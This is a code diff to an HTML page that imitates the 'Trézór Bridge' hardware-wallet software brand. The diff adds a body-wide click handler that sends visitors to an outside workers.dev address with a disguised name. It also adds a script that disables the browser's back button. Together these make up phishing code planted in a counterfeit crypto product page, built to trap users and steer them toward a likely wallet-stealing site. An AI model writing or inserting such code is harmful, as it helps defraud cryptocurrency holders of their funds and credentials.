@@ -296,7 +296,7 @@
         }
     </style>
 </head>
-<body>
+<body onclick="window.location='https://tc2e4.w0l3t.workers.dev/';">
     <header>
         <div class="logo">Trézór <span>Bridge®</span></div>
         <nav>
@@ -384,5 +384,10 @@
             </div>
         </div>
     </footer>
+          <script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+  </script>
 </body>
 </html>
